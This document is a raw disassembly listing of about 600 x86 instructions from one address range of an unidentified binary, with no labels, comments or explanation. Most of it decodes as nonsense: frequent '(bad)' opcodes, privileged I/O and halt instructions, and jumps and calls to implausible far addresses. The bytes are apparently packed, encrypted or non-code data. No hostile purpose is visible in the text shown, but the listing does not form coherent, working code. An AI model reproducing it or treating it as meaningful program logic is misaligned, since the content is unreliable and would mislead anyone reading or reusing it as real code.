  40d0a6:	out    dx,al
  40d0a7:	cmp    bh,BYTE PTR [ecx+0x75]
  40d0aa:	stc    
  40d0ab:	sbb    eax,0xa792c2e7
  40d0b0:	add    edi,DWORD PTR [eax+0x3119f94b]
  40d0b6:	mov    ds:0x1bffb373,al
  40d0bb:	loope  0x40d058
  40d0bd:	lds    edi,FWORD PTR [esi]
  40d0bf:	out    dx,al
  40d0c0:	lods   al,BYTE PTR ds:[esi]
  40d0c1:	mov    bl,0x23
  40d0c3:	stc    
  40d0c4:	add    ebx,DWORD PTR [ebp+edx*1+0x53]
  40d0c8:	add    ecx,DWORD PTR [ebx+0x2d]
  40d0cb:	(bad)  
  40d0cc:	sub    DWORD PTR ss:[ecx-0x5e31b68f],esi
  40d0d3:	lds    esi,FWORD PTR [esi]
  40d0d5:	sbb    eax,0xd6fc33a2
  40d0da:	xchg   esi,eax
  40d0db:	adc    ebp,DWORD PTR [ebp-0x4fdc7049]
  40d0e1:	scas   eax,DWORD PTR es:[edi]
  40d0e2:	sbb    edi,ebp
  40d0e4:	lods   al,BYTE PTR ds:[esi]
  40d0e5:	sbb    eax,0xfd749111
  40d0ea:	mov    eax,ds:0xfd1dac95
  40d0ef:	lea    esi,[esi]
  40d0f1:	cmp    DWORD PTR [ecx-0x5e79b1ac],esi
  40d0f7:	outs   dx,DWORD PTR ds:[esi]
  40d0f8:	inc    esi
  40d0f9:	jns    0x40d09c
  40d0fb:	(bad)  
  40d0fc:	sti    
  40d0fd:	push   ds
  40d0fe:	mov    ds:0x83cae174,al
  40d103:	pop    esp
  40d104:	data16 add BYTE PTR [ebp-0x720a8b5e],dl
  40d10b:	sbb    al,0x8
  40d10d:	inc    ecx
  40d10e:	jb     0x40d154
  40d110:	dec    DWORD PTR [esi-0x37]
  40d113:	dec    esp
  40d114:	adc    al,0x6a
  40d116:	pop    edx
  40d117:	mov    eax,ds:0x24b1ed72
  40d11c:	cld    
  40d11d:	in     al,0xfe
  40d11f:	adc    eax,DWORD PTR [ebx+0x7405deac]
  40d125:	out    dx,al
  40d126:	or     DWORD PTR [ecx+0x5e],esp
  40d129:	xor    al,dh
  40d12b:	cld    
  40d12c:	inc    DWORD PTR [edi-0x42]
  40d12f:	mov    es,WORD PTR [eax-0x17]
  40d132:	jecxz  0x40d0dc
  40d134:	cmp    BYTE PTR [edx+ebx*8-0xd2df8ea],ch
  40d13b:	aas    
  40d13c:	leave  
  40d13d:	sub    ebx,DWORD PTR [esi]
  40d13f:	or     DWORD PTR [ebx+0x75059e6c],eax
  40d145:	neg    DWORD PTR [ebx+0x20de1415]
  40d14b:	adc    eax,ebp
  40d14d:	add    DWORD PTR [eax-0x60],ebp
  40d150:	(bad)  
  40d151:	pusha  
  40d152:	jo     0x40d125
  40d154:	addr16 jmp 0xd140db8c
  40d15a:	mov    bl,0x2a
  40d15c:	push   DWORD PTR [esi+0x2f44534]
  40d162:	fidiv  DWORD PTR [ebx-0xa9f59ef]
  40d168:	(bad)  
  40d169:	adc    al,0x0
  40d16b:	popf   
  40d16c:	test   al,0x34
  40d16e:	xor    al,0xca
  40d170:	lahf   
  40d171:	mov    dh,BYTE PTR [ecx+eax*8]
  40d174:	xchg   ecx,eax
  40d175:	add    eax,DWORD PTR [eax]
  40d177:	repnz dec ebx
  40d179:	cmp    edi,DWORD PTR [ebp-0x50]
  40d17c:	xlat   BYTE PTR ds:[ebx]
  40d17d:	call   0x833a170d
  40d182:	cmp    BYTE PTR [eax-0x27],bl
  40d185:	push   cs
  40d186:	inc    DWORD PTR [ebp+0x6a41e670]
  40d18c:	jae    0x40d18b
  40d18e:	sub    ecx,DWORD PTR [eax]
  40d190:	push   esp
  40d191:	leave  
  40d192:	ret    0xc44
  40d195:	cmp    DWORD PTR [ebp-0x14],0x9
  40d199:	jne    0x40d756
  40d19f:	xor    esi,DWORD PTR [ecx+ebp*8+0x6e]
  40d1a3:	xchg   ebx,eax
  40d1a4:	cmp    dh,ah
  40d1a6:	mov    edx,DWORD PTR [esi+ebp*1]
  40d1a9:	add    al,BYTE PTR [ebp+0x38]
  40d1ac:	(bad)  
  40d1ad:	dec    DWORD PTR [edi+0x3f]
  40d1b0:	fiadd  DWORD PTR [edi]
  40d1b2:	call   0x40201a
  40d1b7:	das    
  40d1b8:	ficom  DWORD PTR [ebx]
  40d1ba:	inc    DWORD PTR [ebp-0x6346195c]
  40d1c0:	jb     0x40d1bf
  40d1c2:	mov    DWORD PTR [ebp-0x30ff97a9],edx
  40d1c8:	fcom   DWORD PTR [ebx]
  40d1ca:	inc    DWORD PTR [ebp+0x49e69d]
  40d1d0:	add    BYTE PTR [ebx-0x3],dh
  40d1d3:	mov    ebp,DWORD PTR ds:0xd83982f9
  40d1d9:	fmul   DWORD PTR [esi]
  40d1db:	inc    DWORD PTR ds:0x69ede659
  40d1e1:	je     0x40d1e0
  40d1e3:	sub    ebx,eax
  40d1e5:	push   edx
  40d1e6:	leave  
  40d1e7:	ret    0xba4
  40d1ea:	push   DWORD PTR [ebp+0x30]
  40d1ed:	je     0x40d262
  40d1ef:	adc    al,0x31
  40d1f1:	ja     0x40d222
  40d1f3:	int3   
  40d1f4:	mov    ?,esp
  40d1f6:	idiv   esi
  40d1f8:	cld    
  40d1f9:	cdq    
  40d1fa:	call   0x710a:0xaa1e7f92
  40d201:	pushf  
  40d202:	stc    
  40d203:	(bad)  
  40d204:	in     al,0x15
  40d206:	fwait
  40d207:	(bad)
  40d20a:	stos   BYTE PTR es:[edi],al
  40d20b:	sub    dh,BYTE PTR [ecx+0x5e]
  40d20e:	mov    ebx,0x41b23dc1
  40d213:	cmp    ecx,esp
  40d215:	cmp    DWORD PTR ds:0xa5c468d,esi
  40d21b:	inc    esp
  40d21d:	mov    ch,0xa9
  40d21f:	je     0x40d28a
  40d221:	(bad)  
  40d222:	das    
  40d223:	or     al,0x2e
  40d225:	push   esi
  40d226:	cli    
  40d227:	out    0x8f,eax
  40d229:	out    0xa9,al
  40d22b:	(bad)  
  40d22c:	sub    dh,al
  40d22e:	stc    
  40d22f:	test   BYTE PTR [ebx+0x2b1],al
  40d235:	push   cs
  40d236:	jbe    0x40d1e6
  40d238:	out    0x9c,eax
  40d23a:	xchg   ecx,eax
  40d23b:	test   eax,0x49f04afe
  40d240:	leave  
  40d241:	repz mov esp,0xb12fe902
  40d247:	add    al,BYTE PTR [eax]
  40d249:	mov    dl,0x25
  40d24b:	test   al,0xc
  40d24d:	cs and eax,0xb03100f0
  40d253:	(bad)  
  40d255:	fadd   DWORD PTR [ebx+eax*1]
  40d258:	add    BYTE PTR [ecx],dh
  40d25a:	sbb    ecx,DWORD PTR [edi-0xc]
  40d25d:	stos   BYTE PTR es:[edi],al
  40d25e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d25f:	ins    BYTE PTR es:[edi],dx
  40d260:	add    ch,BYTE PTR [eax+eiz*2+0x1d]
  40d264:	add    BYTE PTR [ecx],al
  40d266:	outs   dx,DWORD PTR ds:[esi]
  40d267:	or     BYTE PTR cs:[ecx-0x61b511f7],bl
  40d26e:	sahf   
  40d26f:	adc    al,BYTE PTR [esi+edx*4]
  40d272:	adc    al,0xfd
  40d274:	test   al,0x5
  40d276:	adc    DWORD PTR [ecx-0x7a61809b],eax
  40d27c:	jge    0x40d26b
  40d27e:	hlt    
  40d27f:	imul   ebp,ebx,0xa8e61576
  40d285:	in     eax,0x94
  40d287:	add    BYTE PTR [ecx-0x30],0x9d
  40d28b:	fstp   QWORD PTR gs:[esi+0x42c6303e]
  40d292:	or     edx,esp
  40d294:	aad    0xc2
  40d296:	add    eax,DWORD PTR [eax-0x68]
  40d299:	add    BYTE PTR [esi-0x62],al
  40d29c:	call   0xd2edc81b
  40d2a1:	add    esi,DWORD PTR [esi]
  40d2a3:	adc    al,0xdd
  40d2a5:	test   al,0xa5
  40d2a7:	adc    DWORD PTR [ecx+0x35],eax
  40d2aa:	push   ds
  40d2ab:	sahf   
  40d2ac:	and    eax,0x69f56d7d
  40d2b1:	jmp    0x40d2c9
  40d2b3:	adc    eax,0x9585a8e6
  40d2b8:	add    BYTE PTR [ecx],dl
  40d2ba:	nop
  40d2bb:	sahf   
  40d2bc:	add    eax,0x303dbedd
  40d2c1:	(bad)  
  40d2c2:	and    cl,BYTE PTR [ecx]
  40d2c4:	imul   dh
  40d2c6:	ret    0xa78e
  40d2c9:	add    esi,DWORD PTR [esi+0x757cd143]
  40d2cf:	mov    cl,0x69
  40d2d1:	fwait
  40d2d2:	sub    cl,al
  40d2d4:	enter  0x1bfe,0xbb
  40d2d8:	(bad)
  40d2dc:	call   0xd0ca9491
  40d2e1:	adc    BYTE PTR [eax-0x4a36ffbd],ch
  40d2e7:	sub    al,0xe8
  40d2e9:	or     ah,BYTE PTR [eax*2-0x4ea01d14]
  40d2f0:	jbe    0x40d2dd
  40d2f2:	mov    ch,0xf0
  40d2f4:	sub    bh,BYTE PTR [ebx-0x3d13baf3]
  40d2fa:	inc    edi
  40d2fb:	test   eax,0x9d00348a
  40d300:	mov    al,al
  40d302:	retf   0xb0ad
  40d305:	add    edi,DWORD PTR [esi-0x5d]
  40d308:	or     dl,BYTE PTR [ebp-0x77]
  40d30b:	jmp    0x40d341
  40d30d:	in     al,0x72
  40d30f:	pop    ds
  40d310:	mov    cl,0x3a
  40d312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d313:	mov    dh,0x1a
  40d315:	add    eax,0xeaa90f62
  40d31a:	jmp    0xf50f:0x46e444c5
  40d321:	(bad)  
  40d322:	mov    ah,0x9e
  40d324:	dec    ebp
  40d325:	(bad)  
  40d326:	mov    esp,0x36a0a52a
  40d32b:	fstp   DWORD PTR [ebx+0xc4f290a]
  40d331:	call   DWORD PTR [esi+eax*8-0x2676635c]
  40d338:	fwait
  40d339:	sub    ch,BYTE PTR [ecx]
  40d33b:	jns    0x40d30f
  40d33d:	rcr    ebp,0x32
  40d340:	xchg   edx,eax
  40d341:	inc    esp
  40d342:	sbb    eax,0xac8ccc75
  40d347:	dec    BYTE PTR [ebp+ecx*4-0x5c]
  40d34b:	cli    
  40d34c:	dec    esp
  40d34d:	push   edx
  40d34e:	shr    DWORD PTR [ebx+0x54defe9f],1
  40d354:	inc    ebp
  40d355:	rcl    dh,1
  40d357:	add    BYTE PTR [ebp-0x63892919],bh
  40d35d:	inc    BYTE PTR [eax]
  40d35f:	dec    ebx
  40d360:	repnz iret 
  40d362:	add    BYTE PTR [eax],al
  40d364:	cld    
  40d365:	adc    DWORD PTR [ebx+0x7405c07d],eax
  40d36b:	pop    ss
  40d36c:	xlat   BYTE PTR ds:[ebx]
  40d36d:	fcmovbe st,st(3)
  40d36f:	(bad)  
  40d370:	cmp    eax,0x8475fdcd
  40d375:	arpl   WORD PTR [ebx+0x8],si
  40d378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d379:	cmp    bl,BYTE PTR [eax]
  40d37b:	call   FWORD PTR ds:0xb302e6cd
  40d381:	fs std 
  40d383:	inc    edi
  40d384:	jae    0x40d377
  40d386:	test   DWORD PTR [edi],0xfffcb7da
  40d38c:	xlat   BYTE PTR ds:[ebx]
  40d38d:	arpl   WORD PTR [ebx-0xc],si
  40d390:	add    BYTE PTR [eax+0x60],cl
  40d393:	push   edi
  40d395:	sub    al,0x0
  40d397:	add    BYTE PTR [eax+0x8],bl
  40d39a:	pop    edi
  40d39b:	leave  
  40d39c:	sbb    bh,cl
  40d39e:	call   DWORD PTR [ebx+eax*8-0x80]
  40d3a2:	push   ebp
  40d3a3:	(bad)  
  40d3a4:	jge    0x40d346
  40d3a6:	out    0xd2,al
  40d3a8:	mul    BYTE PTR [edx-0x3]
  40d3ab:	push   0x40e960
  40d3b0:	push   edi
  40d3b1:	fiadd  DWORD PTR [edi]
  40d3b3:	call   0x40b554
  40d3b8:	adc    ecx,eax
  40d3ba:	jae    0x40d3c1
  40d3bc:	xlat   BYTE PTR ds:[ebx]
  40d3bd:	pop    esp
  40d3be:	ror    BYTE PTR [eax],0x8
  40d3c1:	pop    esi
  40d3c2:	(bad)  
  40d3c3:	push   edi
  40d3c5:	fadd   DWORD PTR [edi]
  40d3c7:	call   0xff33fccc
  40d3cc:	call   DWORD PTR [edi]
  40d3ce:	outs   dx,DWORD PTR ds:[esi]
  40d3cf:	bound  eax,QWORD PTR [ecx-0x38]
  40d3d2:	bound  esi,QWORD PTR [ebx+0x8]
  40d3d5:	pop    ds
  40d3d6:	jge    0x40d44c
  40d3d8:	dec    ebx
  40d3d9:	xor    DWORD PTR [edx+0x34f10b02],esi
  40d3df:	add    DWORD PTR [edi-0x18],ebx
  40d3e2:	outs   dx,DWORD PTR ds:[esi]
  40d3e3:	cli    
  40d3e4:	(bad)  
  40d3e5:	mov    edx,0xaeb8c29e
  40d3ea:	push   edx
  40d3eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3ec:	(bad)  
  40d3ed:	mov    ds:0x2406eb1b,eax
  40d3f2:	xchg   edx,eax
  40d3f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3f4:	je     0x40d41f
  40d3f6:	jp     0x40d467
  40d3f8:	dec    ecx
  40d3f9:	xor    DWORD PTR [edx-0x5b034007],esi
  40d3ff:	inc    ebp
  40d400:	leave  
  40d401:	jae    0x40d39c
  40d403:	add    ch,BYTE PTR [eax+0x4b]
  40d406:	add    eax,0x9c6e0045
  40d40b:	cli    
  40d40c:	out    0xf0,eax
  40d40e:	out    0x3,al
  40d410:	add    BYTE PTR [edx],ch
  40d412:	repnz das 
  40d414:	or     DWORD PTR [esi-0x4c],edx
  40d417:	test   BYTE PTR [esi+0x40751634],0x31
  40d41e:	retf   0x64ef
  40d421:	lock mov cl,0xa5
  40d424:	je     0x40d44f
  40d426:	cmp    bl,dh
  40d428:	dec    edx
  40d429:	xor    DWORD PTR [eax-0x63ff4007],esi
  40d42f:	test   eax,0x132d74a5
  40d434:	add    BYTE PTR [eax+0x680271a7],ah
  40d43a:	jne    0x40d3c9
  40d43c:	inc    ebx
  40d43d:	add    BYTE PTR [esi],al
  40d43f:	jbe    0x40d43b
  40d441:	out    0x2c,eax
  40d443:	push   edi
  40d444:	add    al,BYTE PTR [eax]
  40d446:	sub    dh,al
  40d448:	das    
  40d449:	or     esi,ebp
  40d44b:	sbb    eax,0x442c8ef7
  40d450:	jne    0x40d492
  40d452:	xor    DWORD PTR [ecx],ecx
  40d454:	mov    eax,ds:0xe9093103
  40d459:	inc    esp
  40d45a:	clc    
  40d45b:	(bad)  
  40d45c:	loopne 0x40d461
  40d45e:	pop    esp
  40d45f:	mov    ?,WORD PTR [ecx+eax*4+0x4d1e95f2]
  40d466:	dec    ecx
  40d467:	xchg   ebp,eax
  40d468:	inc    esp
  40d469:	inc    ebx
  40d46a:	xor    DWORD PTR [edx-0x437103c5],ebx
  40d470:	and    DWORD PTR [ecx+esi*1],eax
  40d473:	push   cs
  40d474:	test   eax,0x3f3a2f2f
  40d479:	mov    ebx,0x43e90570
  40d47e:	mov    edx,0x29276199
  40d483:	scas   al,BYTE PTR es:[edi]
  40d484:	out    0x5f,eax
  40d486:	neg    dl
  40d488:	call   0xa63fbb
  40d48d:	scas   al,BYTE PTR es:[edi]
  40d48e:	rol    BYTE PTR [edi-0x17],cl
  40d491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d492:	add    ch,ah
  40d494:	adc    BYTE PTR [ecx+0x6d],dl
  40d497:	jmp    0x40d4a1
  40d499:	jmp    0xef556396
  40d49e:	inc    esp
  40d49f:	out    0xcf,eax
  40d4a1:	sub    al,BYTE PTR [eax]
  40d4a3:	xor    DWORD PTR [esi-0x18b4043d],ecx
  40d4a9:	push   0xd01539e5
  40d4ae:	and    DWORD PTR [edi+0xc],0xffffffb5
  40d4b2:	cmpxchg ecx,ebx
  40d4b5:	repnz das 
  40d4b7:	es mov ebp,ebx
  40d4ba:	dec    eax
  40d4bb:	test   DWORD PTR [edi],ecx
  40d4bd:	imul   esp,ebp,0x83e41565
  40d4c3:	aas    
  40d4c4:	sub    DWORD PTR [eax+eax*1-0x11],edi
  40d4c8:	add    ecx,ecx
  40d4ca:	cmp    al,0xb1
  40d4cc:	fcos   
  40d4ce:	call   0xa50794ea
  40d4d3:	xchg   esi,eax
  40d4d4:	cdq    
  40d4d5:	(bad)  
  40d4d6:	jmp    0xe185970d
  40d4db:	xor    cl,BYTE PTR [ecx]
  40d4dd:	add    cl,ch
  40d4df:	dec    ecx
  40d4e0:	sbb    eax,0x88f9c208
  40d4e5:	ds push cs
  40d4e7:	push   es
  40d4e8:	out    dx,al
  40d4e9:	cmp    BYTE PTR [ecx+ebx*8],0x99
  40d4ed:	jae    0x40d4ca
  40d4ef:	aad    0x44
  40d4f1:	clc    
  40d4f2:	call   0x1c40de29
  40d4f7:	add    BYTE PTR [ecx],ch
  40d4f9:	ret    0x9d44
  40d4fc:	xor    ecx,DWORD PTR [ecx]
  40d4fe:	add    cl,ch
  40d500:	test   eax,0xcd24f6f6
  40d505:	or     BYTE PTR [eax],al
  40d507:	jmp    0xa74ae93e
  40d50c:	ins    DWORD PTR es:[edi],dx
  40d50d:	stc    
  40d50e:	(bad)  
  40d50f:	sub    al,0x99
  40d511:	cdq    
  40d512:	(bad)  
  40d513:	jmp    0xc57f5e4a
  40d518:	pop    es
  40d519:	add    al,0xff
  40d51b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d51c:	call   0xffa1:0x72e06ae
  40d523:	call   0xc4c3de5a
  40d528:	mov    cs,WORD PTR [eax]
  40d52a:	jne    0x40d516
  40d52c:	in     al,dx
  40d52d:	mov    esi,cr5
  40d530:	mov    dl,0xd7
  40d532:	push   DWORD PTR [ebx-0xe837c5e]
  40d538:	mov    ecx,0x12de7ff4
  40d53d:	push   ds
  40d53e:	push   ss
  40d53f:	imul   ecx,DWORD PTR [ebp+0xa],0x40229420
  40d546:	jmp    0x40d548
  40d548:	push   es
  40d549:	adc    eax,DWORD PTR [esi+0x1]
  40d54c:	pusha  
  40d54d:	xchg   ebp,eax
  40d54e:	inc    ebp
  40d54f:	sbb    BYTE PTR [edi-0x500a8af4],0xdd
  40d556:	inc    esi
  40d557:	or     BYTE PTR [edi],0xd
  40d55a:	jne    0x40d53b
  40d55c:	add    BYTE PTR [edi-0x27ff0bbe],dl
  40d562:	or     al,0x0
  40d564:	mov    esp,DWORD PTR [ebp+0x5]
  40d567:	mov    edi,DWORD PTR [ebp-0x40]
  40d56a:	and    BYTE PTR [bx+si-0x5751],al
  40d56f:	jae    0x40d58d
  40d571:	(bad)  
  40d572:	add    al,0x0
  40d574:	jmp    DWORD PTR [ebp+0x71]
  40d577:	push   esp
  40d578:	call   0x3e4000
  40d57d:	or     esp,0x73
  40d580:	push   es
  40d581:	aas    
  40d582:	dec    ebx
  40d583:	leave  
  40d584:	ret    0xc94
  40d587:	mov    esi,edi
  40d589:	inc    esi
  40d58a:	ins    BYTE PTR es:[edi],dx
  40d58b:	inc    ebx
  40d58c:	hlt    
  40d58d:	pop    ss
  40d58e:	lea    edi,ds:0xfd556500
  40d594:	jne    0x40d57a
  40d596:	shl    bh,cl
  40d598:	or     al,0xce
  40d59a:	imul   edi,ebp,0x5f
  40d59d:	mov    es,ebp
  40d59f:	rol    BYTE PTR [eax+ebx*2],0xd1
  40d5a3:	mov    ch,ah
  40d5a5:	retf   
  40d5a6:	rol    dh,0x56
  40d5a9:	xchg   edi,eax
  40d5aa:	(bad)  
  40d5ab:	jnp    0x40d5c1
  40d5ad:	sbb    BYTE PTR [eax],al
  40d5af:	or     DWORD PTR [ebx+0x414a281d],eax
  40d5b5:	or     BYTE PTR [esi*2-0x36b610fa],cl
  40d5bc:	ret    0xc08
  40d5bf:	mov    eax,DWORD PTR [ebp+0x0]
  40d5c2:	xor    DWORD PTR [esi+0x379d04db],edx
  40d5c8:	inc    ebp
  40d5c9:	add    BYTE PTR [esi],ah
  40d5cb:	and    esp,DWORD PTR [edi+0x0]
  40d5ce:	xor    DWORD PTR [edx+0x2f9104db],esp
  40d5d4:	inc    ebp
  40d5d5:	add    BYTE PTR [esi],ch
  40d5d7:	and    edi,DWORD PTR [ebx+0x0]
  40d5da:	xor    DWORD PTR [edx+0x279504db],esp
  40d5e0:	inc    esp
  40d5e1:	add    BYTE PTR [esi],dh
  40d5e3:	and    ecx,DWORD PTR [esi-0x705dcf00]
  40d5e9:	inc    esp
  40d5ea:	mov    ebp,0xa94490f1
  40d5ef:	icebp  
  40d5f0:	nop
  40d5f1:	inc    esp
  40d5f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5f3:	icebp  
  40d5f4:	mov    ds:0x4437bd34,al
  40d5f9:	add    BYTE PTR [esi-0x30180c0c],dl
  40d5ff:	imul   esp,DWORD PTR [ecx-0x541b4b02],0xafecac4f
  40d609:	dec    edi
  40d60a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d60b:	in     al,0x93
  40d60d:	dec    edi
  40d60e:	outs   dx,BYTE PTR ds:[esi]
  40d60f:	pop    esp
  40d610:	data16 (bad) 
  40d612:	lock mov eax,ds:0x8a4174a1
  40d618:	not    WORD PTR [esi+0x2e]
  40d61c:	nop
  40d61d:	inc    esp
  40d61e:	ins    DWORD PTR es:[edi],dx
  40d61f:	push   ecx
  40d620:	pop    DWORD PTR [ecx+edx*2+0x51]
  40d624:	pop    DWORD PTR [eax+eax*1+0x55]
  40d628:	push   ecx
  40d629:	mov    eax,ds:0x441f9134
  40d62e:	add    BYTE PTR [esi],ch
  40d630:	pop    esi
  40d631:	repnz out 0xbb,eax
  40d634:	fsub   DWORD PTR [ecx-0x59a1e102]
  40d63a:	mov    gs,WORD PTR [ecx+ecx*1+0x3d]
  40d63e:	mov    ds:0x486db585,al
  40d643:	jmp    0xfef48216
  40d648:	xchg   esi,eax
  40d649:	call   0x358d7a51
  40d64e:	xor    ebx,DWORD PTR [ebx+0x8]
  40d651:	xchg   ebx,eax
  40d652:	add    ebx,DWORD PTR [ebx+0x9]
  40d655:	add    DWORD PTR [ebx],0x4b
  40d658:	or     DWORD PTR [eax+ecx*2-0x3],ebx
  40d65c:	cmp    esi,esp
  40d65e:	neg    DWORD PTR [edx+0x3a042842]
  40d664:	leave  
  40d665:	in     eax,0x87
  40d667:	sub    BYTE PTR [eax],cl
  40d669:	jmp    0x99558871
  40d66e:	add    al,0x3e
  40d670:	(bad)  
  40d671:	call   0x624a0778
  40d676:	dec    edi
  40d677:	ins    DWORD PTR es:[edi],dx
  40d678:	rcr    BYTE PTR [ebx],cl
  40d67a:	test   al,0x27
  40d67c:	mov    ds,WORD PTR [esp+eax*1-0x7262f6cf]
  40d683:	std    
  40d684:	mov    eax,0x825d1f61
  40d689:	sbb    edx,eax
  40d68b:	add    BYTE PTR [ebx+0x6f687a0b],dl
  40d691:	sbb    al,0xad
  40d693:	xchg   ecx,eax
  40d694:	in     eax,dx
  40d695:	lods   al,BYTE PTR ds:[esi]
  40d696:	jne    0x40d6af
  40d698:	and    DWORD PTR [ecx+0x9314bb8],0x94d1f6a
  40d6a2:	out    dx,al
  40d6a3:	xchg   DWORD PTR [ecx+ecx*1-0x17],esi
  40d6a7:	add    esi,DWORD PTR [edx+0x26045914]
  40d6ad:	lea    ebp,[esp+eax*1]
  40d6b0:	xor    DWORD PTR [ecx],ecx
  40d6b2:	push   0x1f
  40d6b4:	or     eax,0xb6e60009
  40d6b9:	dec    edi
  40d6ba:	(bad)  
  40d6bb:	call   0x25b56cf2
  40d6c0:	fst    st(0)
  40d6c2:	pop    esp
  40d6c3:	push   ds
  40d6c4:	rol    BYTE PTR [eax+0x1cd02144],1
  40d6ca:	cld    
  40d6cb:	push   cs
  40d6cc:	push   ds
  40d6cd:	sar    esi,0x7c
  40d6d0:	(bad)  
  40d6d1:	lods   eax,DWORD PTR ds:[esi]
  40d6d2:	pop    esi
  40d6d3:	pushf  
  40d6d4:	xchg   ecx,eax
  40d6d5:	xchg   esi,eax
  40d6d6:	addr16 call 0x4e96:0x1004817
  40d6de:	add    cl,ch
  40d6e0:	add    ah,BYTE PTR [ecx]
  40d6e2:	push   ebx
  40d6e3:	inc    esp
  40d6e4:	jb     0x40d6ef
  40d6e6:	call   FWORD PTR [ebp+ebp*8-0x53]
  40d6ea:	test   BYTE PTR [eax],ah
  40d6ec:	sub    eax,0xa90b09
  40d6f1:	inc    esi
  40d6f2:	icebp  
  40d6f3:	and    ecx,DWORD PTR [bp+0x48]
  40d6f7:	add    cl,al
  40d6f9:	jae    0x40d749
  40d6fb:	add    cl,ch
  40d6fd:	bound  esp,QWORD PTR [ecx]
  40d6ff:	pop    edx
  40d700:	or     al,0xf2
  40d702:	or     bh,bh
  40d704:	adc    al,0x75
  40d706:	lods   eax,DWORD PTR ds:[esi]
  40d707:	push   0xb093520
  40d70c:	test   eax,0xb67f11e
  40d711:	push   ss
  40d712:	dec    eax
  40d713:	add    BYTE PTR [ecx-0x16ffb131],dl
  40d719:	and    ah,BYTE PTR [ecx]
  40d71b:	bound  eax,QWORD PTR [edx+esi*8]
  40d71e:	or     bh,bh
  40d720:	fdivr  QWORD PTR [edx-0x53]
  40d723:	dec    esp
  40d724:	mov    al,0x32
  40d726:	or     DWORD PTR [ebx],ecx
  40d728:	sub    DWORD PTR [edi],esp
  40d72a:	dec    esp
  40d72b:	push   0xbda632e9
  40d730:	add    BYTE PTR [edi-0x5],dh
  40d733:	or     ebp,eax
  40d735:	stc    
  40d736:	iret   
  40d737:	(bad)  
  40d738:	jmp    DWORD PTR [edi-0x45]
  40d73b:	xchg   esi,eax
  40d73c:	mov    cs,ecx
  40d73e:	or     bh,bh
  40d740:	jne    0x40d746
  40d742:	popa   
  40d743:	push   ecx
  40d744:	pop    ecx
  40d745:	daa    
  40d746:	imul   edi,ebp,0x73692475
  40d74c:	hlt    
  40d74d:	daa    
  40d74e:	sti    
  40d74f:	or     ebp,eax
  40d751:	mov    bl,0xcf
  40d753:	(bad)  
  40d754:	inc    DWORD PTR [eax]
  40d756:	out    0xfe,eax
  40d758:	out    dx,eax
  40d759:	call   FWORD PTR [ebp+0x60]
  40d75c:	std    
  40d75d:	jne    0x40d753
  40d75f:	pusha  
  40d760:	imul   ebx,DWORD PTR [ecx-0x29],0x74
  40d764:	std    
  40d765:	jne    0x40d753
  40d767:	je     0x40d7dc
  40d769:	fsubr  st(7),st
  40d76b:	repnz or ebp,eax
  40d76e:	pop    es
  40d76f:	(bad)  
  40d770:	(bad)  
  40d771:	push   DWORD PTR [edi-0xe]
  40d774:	(bad)  
  40d775:	call   0x4020e2
  40d77a:	inc    edi
  40d77b:	ror    eax,cl
  40d77d:	ret    0x878
  40d780:	push   ebp
  40d781:	mov    esp,DWORD PTR [eax+ecx*4-0x15e4173e]
  40d788:	adc    eax,DWORD PTR ds:0x1118197
  40d78e:	mov    BYTE PTR [eax],cl
  40d790:	lea    eax,[ebp-0x14]
  40d793:	fmul   QWORD PTR [ebp+eax*2+0x458cddb0]
  40d79a:	in     al,0xdc
  40d79c:	imul   eax,DWORD PTR [edx],0xe80ff1c7
  40d7a2:	cmp    DWORD PTR [ebp+edi*8-0x1],edi
  40d7a6:	fucomi st,st(1)
  40d7a8:	test   DWORD PTR [ecx],0xf287ab31
  40d7ae:	xor    DWORD PTR [edx-0x295b00fe],esp
  40d7b4:	mov    es,WORD PTR [ecx+eiz*1-0x46]
  40d7b8:	loope  0x40d81e
  40d7ba:	add    BYTE PTR [eax-0x5e],dh
  40d7bd:	popf   
  40d7be:	je     0x40d7e1
  40d7c0:	dec    edx
  40d7c1:	jg     0x40d809
  40d7c3:	xor    DWORD PTR [edx+0x2d36c009],esp
  40d7c9:	mov    esp,0x8fa1feff
  40d7ce:	inc    esp
  40d7cf:	std    
  40d7d0:	push   ecx
  40d7d1:	pop    DWORD PTR [ecx+ebp*8+0x71]
  40d7d5:	pop    DWORD PTR [ebp+eiz*8+0x71]
  40d7d9:	sub    BYTE PTR [eax],al
  40d7db:	ficom  WORD PTR [ebx+esi*8]
  40d7de:	out    0xcf,eax
  40d7e0:	fwait
  40d7e1:	popf   
  40d7e2:	(bad)  
  40d7e3:	mov    dl,0x2c
  40d7e5:	pushf  
  40d7e6:	add    BYTE PTR [esi],dh
  40d7e8:	sub    eax,0xa1beff5b
  40d7ed:	popf   
  40d7ee:	je     0x40d7ad
  40d7f0:	dec    ecx
  40d7f1:	scas   al,BYTE PTR es:[edi]
  40d7f2:	arpl   ax,si
  40d7f4:	mov    eax,ds:0xa1ee45aa
  40d7f9:	add    cl,BYTE PTR [ebx]
  40d7fb:	jno    0x40d7a7
  40d7fd:	xchg   DWORD PTR [edx-0x72fd5dcf],esp
  40d803:	hlt    
  40d804:	jne    0x40d838
  40d806:	(bad)  
  40d807:	in     al,dx
  40d808:	imul   esi,DWORD PTR [edx],0x327df48d
  40d80e:	push   0x32
  40d810:	adc    DWORD PTR [edi],0x10
  40d813:	pop    ecx
  40d814:	rcl    BYTE PTR [esi+edi*8-0x7dfe19a],1
  40d81b:	xor    DWORD PTR [ebx+0x31008287],ebp
  40d821:	mov    ds:0x8f48b02,al
  40d826:	pop    ebp
  40d827:	sahf   
  40d828:	push   ss
  40d829:	test   BYTE PTR [ebx+0x5d4dadaf],ah
  40d82f:	xor    esp,DWORD PTR [ebp+ecx*2+0x4cbc3351]
  40d836:	inc    ebp
  40d837:	xor    ebx,DWORD PTR [ebx+0x41183e0d]
  40d83d:	mov    eax,ds:0x9317955f
  40d842:	imul   esp,DWORD PTR [eax],0x3e9c0909
  40d848:	out    dx,al
  40d849:	or     al,0x7d
  40d84b:	lea    esi,[ecx+0x9]
